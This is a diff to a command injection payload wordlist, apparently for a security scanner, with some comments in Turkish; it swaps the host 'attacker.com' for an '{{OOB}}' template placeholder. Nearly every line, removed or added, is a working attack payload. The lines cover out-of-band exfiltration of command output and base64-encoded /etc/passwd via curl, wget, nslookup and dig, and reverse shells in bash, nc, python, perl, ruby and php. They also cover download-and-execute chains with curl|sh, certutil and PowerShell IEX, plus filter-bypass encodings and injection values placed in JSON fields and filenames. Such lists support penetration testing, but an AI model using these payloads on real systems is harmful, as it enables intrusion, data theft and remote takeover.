@@ -102,27 +102,27 @@ $(sleep${IFS}3)
 & ping -n 1 127.0.0.1 > nul & whoami
 
 # ── OOB: DNS / HTTP ──
-;curl http://attacker.com/$(id)
-;wget http://attacker.com/$(id)
-;curl -s http://attacker.com/?c=$(id|base64)
-;curl -s http://attacker.com/?c=$(cat /etc/passwd|base64)
-;nslookup $(whoami).attacker.com
-;nslookup `whoami`.attacker.com
-;host `id`.attacker.com
-;ping -c 1 `id`.attacker.com
-;curl http://$(id).attacker.com/
-$(curl http://attacker.com/?x=$(id))
-`curl http://attacker.com/?x=\`id\``
-;curl -X POST http://attacker.com/ -d "$(id)"
-;curl -X POST http://attacker.com/ -d "$(cat /etc/passwd|base64)"
-;wget -q -O- http://attacker.com/?x=$(id|base64)
-;curl -s http://attacker.com/?c=$(cat /etc/passwd|base64 -w0)
-;dig @attacker.com $(whoami).attacker.com
-;nslookup -type=A $(whoami).attacker.com attacker.com
-;host $(id|base64).attacker.com
-;python3 -c "import urllib.request;urllib.request.urlopen('http://attacker.com/?x='+__import__('subprocess').check_output('id',shell=True).decode())"
-& nslookup attacker.com
-& ping /n 1 attacker.com
+;curl http://{{OOB}}/$(id)
+;wget http://{{OOB}}/$(id)
+;curl -s http://{{OOB}}/?c=$(id|base64)
+;curl -s http://{{OOB}}/?c=$(cat /etc/passwd|base64)
+;nslookup $(whoami).{{OOB}}
+;nslookup `whoami`.{{OOB}}
+;host `id`.{{OOB}}
+;ping -c 1 `id`.{{OOB}}
+;curl http://$(id).{{OOB}}/
+$(curl http://{{OOB}}/?x=$(id))
+`curl http://{{OOB}}/?x=\`id\``
+;curl -X POST http://{{OOB}}/ -d "$(id)"
+;curl -X POST http://{{OOB}}/ -d "$(cat /etc/passwd|base64)"
+;wget -q -O- http://{{OOB}}/?x=$(id|base64)
+;curl -s http://{{OOB}}/?c=$(cat /etc/passwd|base64 -w0)
+;dig @{{OOB}} $(whoami).{{OOB}}
+;nslookup -type=A $(whoami).{{OOB}} {{OOB}}
+;host $(id|base64).{{OOB}}
+;python3 -c "import urllib.request;urllib.request.urlopen('http://{{OOB}}/?x='+__import__('subprocess').check_output('id',shell=True).decode())"
+& nslookup {{OOB}}
+& ping /n 1 {{OOB}}
 
 # ── ENCODING BYPASS ──
 ;%69%64
@@ -234,9 +234,9 @@ $(printf '\x69\x64')
 ; powershell -enc dwBoAG8AYQBtAGkA
 ; powershell -w hidden -c whoami
 ; powershell -NoP -NonI -W Hidden -Exec Bypass -c whoami
-; powershell -c "(New-Object Net.WebClient).DownloadString('http://attacker.com/')"
-; powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/s.ps1')
-; powershell -c "Invoke-WebRequest http://attacker.com/?x=$(whoami)"
+; powershell -c "(New-Object Net.WebClient).DownloadString('http://{{OOB}}/')"
+; powershell IEX(New-Object Net.WebClient).DownloadString('http://{{OOB}}/s.ps1')
+; powershell -c "Invoke-WebRequest http://{{OOB}}/?x=$(whoami)"
 ; powershell -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((whoami)))"
 & cmd /c whoami
 & cmd.exe /c whoami
@@ -338,7 +338,7 @@ Accept-Encoding: ;id
 {"cmd": ";id"}
 {"filename": ";id.jpg"}
 {"path": "/../../../tmp/;id"}
-{"url": "http://attacker.com/$(id)"}
+{"url": "http://{{OOB}}/$(id)"}
 Content-Disposition: form-data; name="file"; filename=";id.jpg"
 Content-Disposition: form-data; name="file"; filename="$(id).jpg"
 Content-Disposition: form-data; name="file"; filename="`id`.jpg"
@@ -373,18 +373,18 @@ Content-Disposition: form-data; name="file"; filename="`id`.jpg"
 ; [ -r /etc/shadow ] && sleep 5
 
 # ── REVERSE SHELL VARIANTS ──
-;bash -i >& /dev/tcp/attacker.com/4444 0>&1
-;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
-;0<&196;exec 196<>/dev/tcp/attacker.com/4444;sh <&196 >&196 2>&196
-;nc -e /bin/sh attacker.com 4444
-;nc attacker.com 4444 -e /bin/bash
-;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444>/tmp/f
-;python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
-;perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
-;ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-;php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
-;sh -i >& /dev/tcp/attacker.com/4444 0>&1
-;nc attacker.com 4444 -e /bin/sh
+;bash -i >& /dev/tcp/{{OOB}}/4444 0>&1
+;bash -c 'bash -i >& /dev/tcp/{{OOB}}/4444 0>&1'
+;0<&196;exec 196<>/dev/tcp/{{OOB}}/4444;sh <&196 >&196 2>&196
+;nc -e /bin/sh {{OOB}} 4444
+;nc {{OOB}} 4444 -e /bin/bash
+;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{OOB}} 4444>/tmp/f
+;python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("{{OOB}}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+;perl -e 'use Socket;$i="{{OOB}}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+;ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{{OOB}}","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+;php -r '$sock=fsockopen("{{OOB}}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+;sh -i >& /dev/tcp/{{OOB}}/4444 0>&1
+;nc {{OOB}} 4444 -e /bin/sh
 
 # ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
 # ${IFS} / brace expansion / boşluk bypass
@@ -397,23 +397,23 @@ cat</etc/passwd
 # karakter araya sokma (filtre bypass)
 ;u'n'a'm'e -a
 ;c\at /e\tc/pa\sswd
-;n''sl''ookup attacker.com
+;n''sl''ookup {{OOB}}
 # base64 decode + indir-çalıştır zinciri
 ;echo${IFS}aWQ=|base64${IFS}-d|sh
-;curl${IFS}attacker.com|sh
-;wget${IFS}attacker.com/s;sh${IFS}s
+;curl${IFS}{{OOB}}|sh
+;wget${IFS}{{OOB}}/s;sh${IFS}s
 # zaman tabanlı blind (Linux/Windows)
 $(sleep 5)
 &ping -n 5 127.0.0.1
 &timeout /t 5
 # OOB DNS exfil (komut çıktısını subdomain'e koy)
-|nslookup $(whoami).attacker.com
-;curl http://$(whoami).attacker.com
-;dig `id|base64`.attacker.com
+|nslookup $(whoami).{{OOB}}
+;curl http://$(whoami).{{OOB}}
+;dig `id|base64`.{{OOB}}
 # Windows indir-çalıştır
-&certutil -urlcache -f http://attacker.com/x.exe x.exe
+&certutil -urlcache -f http://{{OOB}}/x.exe x.exe
 &powershell -nop -w hidden -enc SQBFAFgA
-&powershell IEX(New-Object Net.WebClient).downloadString('http://attacker.com/x')
+&powershell IEX(New-Object Net.WebClient).downloadString('http://{{OOB}}/x')
 # URL-encoded ayraçlar
 %0d%0aid
 %26%26id
